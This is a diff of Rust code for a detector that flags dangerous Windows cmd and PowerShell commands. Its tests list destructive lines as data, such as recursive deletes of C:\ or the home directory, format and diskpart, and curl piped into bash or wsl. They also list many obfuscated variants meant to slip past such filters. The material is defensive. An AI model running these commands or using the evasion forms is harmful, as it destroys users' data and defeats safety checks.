@@ -497,12 +497,18 @@ enum Flavor {
     Ps,
 }
 
-const WIN_PIPE_SHELLS: &[&str] = &["iex", "invoke-expression", "powershell", "pwsh", "cmd"];
+/// Commands a pipe must not feed: iex, another shell, and (ruling, beyond ruling 9) the POSIX
+/// shells and wsl, since `curl.exe x | bash` reaches WSL's bash.
+const WIN_PIPE_SHELLS: &[&str] = &["iex", "invoke-expression", "powershell", "pwsh", "cmd", "wsl"];
 const PS_REMOVE: &[&str] = &["remove-item", "ri", "rm", "rmdir", "rd", "del", "erase"];
 const WIN_TARGETS: &[&str] = &[
     "~",
     "$home",
     "${home}",
+    "${env:userprofile}",
+    "${env:homedrive}",
+    "${env:systemdrive}",
+    "${env:homedrive}${env:homepath}",
     "$env:userprofile",
     "$env:homedrive",
     "$env:systemdrive",
@@ -575,6 +581,14 @@ fn scan_win(line: &str, f: Flavor) -> Result<Vec<(String, bool)>, ()> {
             i += 1;
             continue;
         }
+        // PowerShell's `${name}` is a variable, not a script block.
+        if f == Flavor::Ps && c == '$' && next == Some('{') {
+            if let Some(end) = braced_var_end(&chars, i) {
+                cur.extend(&chars[i..end]);
+                i = end;
+                continue;
+            }
+        }
         let mut split = |after_pipe: bool, cur: &mut String, cur_pipe: &mut bool| {
             segs.push((std::mem::take(cur), *cur_pipe));
             *cur_pipe = after_pipe;
@@ -611,6 +625,14 @@ fn scan_win(line: &str, f: Flavor) -> Result<Vec<(String, bool)>, ()> {
                     i += 1;
                 }
                 ';' if f == Flavor::Ps => split(false, &mut cur, &mut cur_pipe),
+                // Grouping and script blocks start and end commands: each inner command is
+                // checked as a segment of its own.
+                // A bracket right after a pipe keeps the pipe for the command it opens.
+                '(' | ')' | '{' | '}' => {
+                    if !cur.trim().is_empty() {
+                        split(false, &mut cur, &mut cur_pipe);
+                    }
+                }
                 '\n' => split(false, &mut cur, &mut cur_pipe),
                 _ => cur.push(c),
             }
@@ -698,35 +720,181 @@ fn win_command_name(token: &str) -> String {
     base.to_string()
 }
 
-/// The effective command: a leading `@` (cmd), `&` (PowerShell's call operator) and `call` skipped.
-fn win_effective_command(words: &[String]) -> Option<(String, Vec<String>)> {
-    let mut i = 0;
-    while i < words.len() {
-        let w = words[i].trim_start_matches('@');
-        if w.is_empty() || w == "&" || w.eq_ignore_ascii_case("call") {
-            i += 1;
-            continue;
-        }
-        return Some((win_command_name(w), words[i + 1..].to_vec()));
+/// One normalizing pass before any matching (Task 9 review, the floor is not a parser): what
+/// PowerShell's lexer accepts as a dash, a quote or whitespace becomes ASCII, and a line
+/// continued with the shell's escape before a line break is joined.
+fn normalize_win(line: &str, f: Flavor) -> String {
+    let mut s = String::with_capacity(line.len());
+    for c in line.chars() {
+        s.push(if f == Flavor::Ps { ps_ascii(c) } else { c });
     }
-    None
+    s.replace(&format!("{}\n", escape_char(f)), "")
 }
 
-/// A drive root or the home directory in any of its spellings, optionally with a trailing
-/// separator, `*`, `\*` or `/*`.
-fn is_win_target(token: &str) -> bool {
-    let lower = token.to_lowercase();
-    let mut s = lower.as_str();
-    s = s.strip_suffix('*').unwrap_or(s);
-    let trimmed = s.trim_end_matches(['\\', '/']);
-    if trimmed.is_empty() {
-        return s.len() > trimmed.len();
+/// Where a PowerShell `${name}` variable starting at `chars[i]` ends (past its `}`), if it does.
+fn braced_var_end(chars: &[char], i: usize) -> Option<usize> {
+    let close = chars[i + 2..].iter().position(|&c| c == '}')?;
+    Some(i + 2 + close + 1)
+}
+
+/// The line with grouping brackets read as spaces (a PowerShell `${name}` is kept).
+fn flatten_brackets(line: &str, f: Flavor) -> String {
+    let chars: Vec<char> = line.chars().collect();
+    let mut out = String::with_capacity(line.len());
+    let mut i = 0;
+    while i < chars.len() {
+        if f == Flavor::Ps && chars[i] == '$' && chars.get(i + 1) == Some(&'{') {
+            if let Some(end) = braced_var_end(&chars, i) {
+                out.extend(&chars[i..end]);
+                i = end;
+                continue;
+            }
+        }
+        out.push(if matches!(chars[i], '(' | ')' | '{' | '}') { ' ' } else { chars[i] });
+        i += 1;
     }
-    let b: Vec<char> = trimmed.chars().collect();
+    out
+}
+
+/// PowerShell reads U+2013 to U+2015 as a parameter dash, the curly quotes as quotes, and any
+/// Unicode space as whitespace.
+fn ps_ascii(c: char) -> char {
+    match c {
+        '\u{2013}' | '\u{2014}' | '\u{2015}' => '-',
+        '\u{2018}' | '\u{2019}' | '\u{201a}' | '\u{201b}' => '\'',
+        '\u{201c}' | '\u{201d}' | '\u{201e}' | '\u{201f}' => '"',
+        '\u{85}' | '\u{2028}' | '\u{2029}' => '\n',
+        ' ' | '\t' | '\n' => c,
+        c if c.is_whitespace() => ' ',
+        c => c,
+    }
+}
+
+/// The words of a cmd line, each cut at cmd's own argument delimiters `,` `;` `=` (quotes are
+/// already gone).
+fn cmd_pieces(word: &str) -> Vec<String> {
+    word.split([',', ';', '=']).filter(|p| !p.is_empty()).map(str::to_string).collect()
+}
+
+/// The command named by `words[i]` and its arguments. cmd ends a command's name at `/`, `,`, `;`
+/// or `=` (`rd/s/q C:\` is `rd /s /q C:\`), and splits its arguments at the same delimiters.
+fn split_head(words: &[String], i: usize, f: Flavor) -> (String, Vec<String>) {
+    let w = words[i].trim_start_matches('@');
+    let mut args: Vec<String> = Vec::new();
+    let mut name = w;
+    if f == Flavor::Cmd {
+        // A path with a directory keeps its own slashes; only a bare word is cut.
+        if let Some(at) = w.find(['/', ',', ';', '=']).filter(|&at| at > 0 && !w[..at].contains(['\\', ':'])) {
+            name = &w[..at];
+            args.extend(cmd_pieces(&w[at..]));
+        }
+    }
+    for a in &words[i + 1..] {
+        if f == Flavor::Cmd {
+            args.extend(cmd_pieces(a));
+        } else {
+            args.push(a.clone());
+        }
+    }
+    (win_command_name(name), args)
+}
+
+/// The indexes where a command starts: the first word after `@`, `&`, `call` and `.` (dot
+/// source), and in cmd the word after an `if` clause, `do` or `else`.
+fn command_heads(words: &[String], f: Flavor) -> Vec<usize> {
+    let lower = |i: usize| words.get(i).map(|w| w.trim_start_matches('@').to_lowercase());
+    let mut heads = Vec::new();
+    let mut at_head = true;
+    let mut i = 0;
+    while i < words.len() {
+        let w = lower(i).unwrap_or_default();
+        if at_head {
+            match w.as_str() {
+                "" | "&" | "call" | "." => {
+                    i += 1;
+                    continue;
+                }
+                "do" | "else" if f == Flavor::Cmd => {
+                    i += 1;
+                    continue;
+                }
+                "if" if f == Flavor::Cmd => {
+                    i += 1;
+                    while matches!(lower(i).as_deref(), Some("/i" | "not")) {
+                        i += 1;
+                    }
+                    i += match lower(i).as_deref() {
+                        Some("exist" | "defined" | "errorlevel" | "cmdextversion") => 2,
+                        _ if matches!(lower(i + 1).as_deref(), Some("equ" | "neq" | "lss" | "leq" | "gtr" | "geq")) => 3,
+                        _ => 1,
+                    };
+                    continue;
+                }
+                _ => {}
+            }
+            heads.push(i);
+            at_head = false;
+        }
+        if f == Flavor::Cmd && matches!(w.as_str(), "do" | "else") {
+            at_head = true;
+        }
+        i += 1;
+    }
+    heads
+}
+
+/// A drive root or the home directory in any of its spellings: with a trailing separator, `*`,
+/// `*.*`, `\.` or `\..`, a `\\?\` prefix, quotes already stripped.
+fn is_win_target(token: &str) -> bool {
+    let mut s = token.to_lowercase();
+    for prefix in ["\\\\?\\", "\\\\.\\"] {
+        if let Some(rest) = s.strip_prefix(prefix) {
+            s = rest.to_string();
+            break;
+        }
+    }
+    // A separator, wildcard or dot component was taken off: what is left names the parent.
+    let mut separator = false;
+    loop {
+        let before = s.len();
+        if let Some(r) = s.strip_suffix("*.*").or_else(|| s.strip_suffix('*')) {
+            s = r.to_string();
+        }
+        let trimmed = s.trim_end_matches(['\\', '/']);
+        if trimmed.len() != s.len() {
+            separator = true;
+            s = trimmed.to_string();
+        }
+        for dots in ["\\..", "/..", "\\.", "/."] {
+            if let Some(r) = s.strip_suffix(dots) {
+                s = r.to_string();
+                separator = true;
+                break;
+            }
+        }
+        if s.len() == before {
+            break;
+        }
+    }
+    if s.is_empty() {
+        return separator;
+    }
+    let b: Vec<char> = s.chars().collect();
     if b.len() == 2 && b[0].is_ascii_alphabetic() && b[1] == ':' {
         return true;
     }
-    WIN_TARGETS.contains(&trimmed)
+    WIN_TARGETS.contains(&s.as_str())
+}
+
+/// A target argument, also as the value of a colon-bound PowerShell parameter (`-Path:C:\`).
+fn arg_is_target(arg: &str) -> bool {
+    if is_win_target(arg) {
+        return true;
+    }
+    match arg.strip_prefix('-').and_then(|a| a.split_once(':')) {
+        Some((_, value)) => is_win_target(value),
+        None => false,
+    }
 }
 
 /// cmd's `/s` switch, alone or combined (`/s`, `/S`, `/s/q`, `/q/s`).
@@ -743,35 +911,58 @@ fn has_ps_recurse(args: &[String]) -> bool {
     })
 }
 
+/// Whether `cmd` with `args` is a recursive delete (its target not looked at).
+fn is_recursive_delete(cmd: &str, args: &[String], f: Flavor) -> bool {
+    match f {
+        Flavor::Cmd => matches!(cmd, "del" | "erase" | "rd" | "rmdir") && has_slash_s(args),
+        Flavor::Ps => PS_REMOVE.contains(&cmd) && has_ps_recurse(args),
+    }
+}
+
 fn windows_flavor(line: &str, f: Flavor, depth: usize) -> Option<String> {
-    let segs = match scan_win(line, f) {
+    let norm = normalize_win(line, f);
+    let segs = match scan_win(&norm, f) {
         Ok(s) => s,
         Err(()) => return Some(UNBALANCED.to_string()),
     };
+    // A pipeline's earlier segments named a target (`Get-ChildItem C:\ | Remove-Item -Recurse`).
+    let mut chain_target = false;
     for (text, after_pipe) in &segs {
+        if !after_pipe {
+            chain_target = false;
+        }
         let words = tokenize_win(text, f);
-        let Some((cmd, args)) = win_effective_command(&words) else { continue };
-        if let Some(r) = windows_verdict(&cmd, &args, *after_pipe, f, depth) {
-            return Some(r);
+        let mut first = true;
+        for h in command_heads(&words, f) {
+            let (cmd, args) = split_head(&words, h, f);
+            let piped = *after_pipe && first;
+            first = false;
+            if let Some(r) = windows_verdict(&cmd, &args, piped, chain_target, f, depth) {
+                return Some(r);
+            }
+        }
+        chain_target |= words.iter().any(|w| arg_is_target(w));
+    }
+    // A delete anywhere in a segment, brackets read as spaces so the arguments flow across them
+    // (`Remove-Item -Recurse (Get-Item C:\)`, `if exist x rd /s /q C:\`).
+    let flat = flatten_brackets(&norm, f);
+    for (text, _) in scan_win(&flat, f).unwrap_or_default() {
+        let words = tokenize_win(&text, f);
+        for i in 0..words.len() {
+            let (cmd, args) = split_head(&words, i, f);
+            if is_recursive_delete(&cmd, &args, f) && args.iter().any(|a| arg_is_target(a)) {
+                return Some(WIN_DELETE.to_string());
+            }
         }
     }
     None
 }
 
-fn windows_verdict(cmd: &str, args: &[String], after_pipe: bool, f: Flavor, depth: usize) -> Option<String> {
-    if after_pipe && WIN_PIPE_SHELLS.contains(&cmd) {
+fn windows_verdict(cmd: &str, args: &[String], after_pipe: bool, chain_target: bool, f: Flavor, depth: usize) -> Option<String> {
+    if after_pipe && (WIN_PIPE_SHELLS.contains(&cmd) || SHELLS.contains(&cmd)) {
         return Some(pipe_reason(cmd));
     }
-    let delete = match f {
-        Flavor::Cmd => match cmd {
-            "del" | "erase" | "rd" | "rmdir" => {
-                has_slash_s(args)
-            }
-            _ => false,
-        },
-        Flavor::Ps => PS_REMOVE.contains(&cmd) && has_ps_recurse(args),
-    };
-    if delete && args.iter().any(|a| is_win_target(a)) {
+    if is_recursive_delete(cmd, args, f) && (args.iter().any(|a| arg_is_target(a)) || (after_pipe && chain_target && f == Flavor::Ps)) {
         return Some(WIN_DELETE.to_string());
     }
     if cmd == "format" || cmd == "format-volume" {
@@ -789,16 +980,27 @@ fn windows_verdict(cmd: &str, args: &[String], after_pipe: bool, f: Flavor, dept
 }
 
 /// The line a `cmd /c`, `cmd /k`, `powershell -Command` or `pwsh -c` wrapper runs, and the shell
-/// that runs it.
+/// that runs it. cmd also takes the line glued to the switch (`/c"..."`).
 fn wrapped_line(cmd: &str, args: &[String]) -> Option<(String, Flavor)> {
-    let (flag, flavor): (fn(&str) -> bool, Flavor) = match cmd {
-        "cmd" => (|a| a == "/c" || a == "/k" || a == "/r", Flavor::Cmd),
-        "powershell" | "pwsh" => (|a| a.len() >= 2 && a.starts_with('-') && "-command".starts_with(a), Flavor::Ps),
-        _ => return None,
-    };
-    let at = args.iter().position(|a| flag(&a.to_lowercase()))?;
-    let rest = args[at + 1..].join(" ");
-    Some((rest, flavor))
+    match cmd {
+        "cmd" => {
+            let at = args.iter().position(|a| {
+                let a = a.to_lowercase();
+                a.starts_with("/c") || a.starts_with("/k") || a.starts_with("/r")
+            })?;
+            let glued = &args[at][2..];
+            let rest = std::iter::once(glued).chain(args[at + 1..].iter().map(String::as_str)).collect::<Vec<_>>().join(" ");
+            Some((rest, Flavor::Cmd))
+        }
+        "powershell" | "pwsh" => {
+            let at = args.iter().position(|a| {
+                let a = a.to_lowercase();
+                a.len() >= 2 && a.starts_with('-') && "-command".starts_with(&a)
+            })?;
+            Some((args[at + 1..].join(" "), Flavor::Ps))
+        }
+        _ => None,
+    }
 }
 
 pub const ESCAPE: &str = "the command contains a terminal escape sequence";
@@ -1031,6 +1233,100 @@ mod tests {
         assert_eq!(split_windows("echo 'a; b'", PowerShell).unwrap().len(), 1);
         assert_eq!(split_windows("echo 'a; b'", Cmd).unwrap().len(), 1);
         assert_eq!(split_windows("\"a", Cmd), Err(()));
+    }
+
+    /// Task 9 review, Important 1 to 3: the Windows set normalizes before matching; every form
+    /// the review listed, one line each. `del` is the drive-or-home reason.
+    #[test]
+    fn windows_floor_survives_rewrites() {
+        let del = s(WIN_DELETE);
+        let mut miss: Vec<String> = Vec::new();
+        let mut expect = |label: &str, line: &str, got: Option<String>, want: &Option<String>| {
+            if &got != want {
+                miss.push(format!("{label} {line:?}: got {got:?}"));
+            }
+        };
+        let cmd_del = [
+            "del /s /q C:\\*.*",
+            "del /s /q %USERPROFILE%\\*.*",
+            "rd /s /q C:\\.",
+            "rd /s /q C:\\..",
+            "rd/s/q C:\\",
+            "del/s/q C:\\*",
+            "(rd /s /q C:\\)",
+            "if exist C:\\ rd /s /q C:\\",
+            "if not exist C:\\x rd /s /q C:\\",
+            "for %i in (1) do rd /s /q C:\\",
+            "rd /s /q ^\nC:\\",
+            "rd,/s,/q,C:\\",
+            "rd /s /q=C:\\",
+            "rd /s /q \\\\?\\C:\\",
+            "cmd /c\"rd /s /q C:\\\"",
+            "cmd /c (rd /s /q C:\\)",
+        ];
+        for line in cmd_del {
+            expect("cmd", line, windows(line, Cmd), &del);
+            expect("unknown", line, windows(line, Unknown), &del);
+        }
+        let cmd_none = ["rd /s /q C:\\build\\.", "echo (rd /s /q C:\\build)", "if exist C:\\x echo hi", "dotnet format", "for %i in (1) do echo %i", "rd /s /q C:\\a,b"];
+        for line in cmd_none {
+            expect("cmd", line, windows(line, Cmd), &None);
+        }
+        expect("form", "if exist x format C:", windows("if exist x format C:", Cmd), &s(WIN_FORMAT));
+        expect("form", "for %i in (1) do format C:", windows("for %i in (1) do format C:", Cmd), &s(WIN_FORMAT));
+        expect("form", "(diskpart)", windows("(diskpart)", Cmd), &s(WIN_DISKPART));
+
+        let ps_del = [
+            "Remove-Item -Recurse ${env:USERPROFILE}",
+            "Remove-Item -Recurse ${env:HOMEDRIVE}",
+            "Remove-Item -Recurse ${HOME}",
+            "Remove-Item -Recurse -Path:C:\\",
+            "Remove-Item -Recurse -LiteralPath:C:\\",
+            "Remove-Item -Recurse -Path:'C:\\'",
+            "Remove-Item -Recurse \\\\?\\C:\\",
+            "Remove-Item -Recurse C:\\*.*",
+            "Remove-Item -Recurse C:\\.",
+            "Remove-Item -Recurse C:\\..",
+            "& {Remove-Item -Recurse C:\\}",
+            "(Remove-Item -Recurse C:\\)",
+            "Remove-Item -Recurse (Get-Item C:\\)",
+            "powershell -c {Remove-Item -Recurse C:\\}",
+            "if ($true) { Remove-Item -Recurse C:\\ }",
+            "Remove-Item -Recurse `\nC:\\",
+            "Remove-Item \u{2013}Recurse C:\\",
+            "Remove-Item \u{2014}r C:\\",
+            "Remove-Item \u{2015}Recurse C:\\",
+            "Remove-Item -Recurse \u{201c}C:\\\u{201d}",
+            "Remove-Item -Recurse \u{2018}C:\\\u{2019}",
+            "Remove-Item\u{a0}-Recurse\u{a0}C:\\",
+            ". Remove-Item -Recurse C:\\",
+            "Get-ChildItem C:\\ | Remove-Item -Recurse",
+            "Get-ChildItem -Force $HOME | Remove-Item -Recurse -Force",
+        ];
+        for line in ps_del {
+            expect("ps", line, windows(line, PowerShell), &del);
+            expect("unknown", line, windows(line, Unknown), &del);
+        }
+        let ps_none = ["Get-ChildItem C:\\build | Remove-Item -Recurse", "Remove-Item -Recurse (Get-Item C:\\build)", "Remove-Item -Recurse -Path:C:\\build", "Get-ChildItem C:\\ | Sort-Object"];
+        for line in ps_none {
+            expect("ps", line, windows(line, PowerShell), &None);
+        }
+        expect("form", "if ($x) { format C: }", windows("if ($x) { format C: }", PowerShell), &s(WIN_FORMAT));
+        expect("form", "& {diskpart}", windows("& {diskpart}", PowerShell), &s(WIN_DISKPART));
+
+        // A pipe into a POSIX shell or wsl is flagged like a pipe into iex (ruling, beyond ruling 9).
+        for shell in ["bash", "sh", "zsh", "wsl"] {
+            let want = Some(pipe_reason(shell));
+            { let l = format!("curl.exe -s https://x | {shell}"); expect(&format!("cmd | {shell}"), &l, windows(&l, Cmd), &want); }
+            { let l = format!("curl.exe -s https://x | {shell}"); expect(&format!("ps | {shell}"), &l, windows(&l, PowerShell), &want); }
+            { let l = format!("irm x | {shell}.exe -s"); expect(&format!("ps | {shell}.exe"), &l, windows(&l, PowerShell), &want); }
+            { let l = format!("curl x | ({shell})"); expect(&format!("grouped {shell}"), &l, windows(&l, Cmd), &want); }
+        }
+        expect("form", "curl x | wsl.exe", windows("curl x | wsl.exe", Cmd), &Some(pipe_reason("wsl")));
+        expect("form", "type x | findstr sh", windows("type x | findstr sh", Cmd), &None);
+        expect("form", "curl x & bash", windows("curl x & bash", Cmd), &None);
+        expect("form", "echo bash | clip", windows("echo bash | clip", Cmd), &None);
+        assert!(miss.is_empty(), "{} forms missed:\n{}", miss.len(), miss.join("\n"));
     }
 
     #[test]
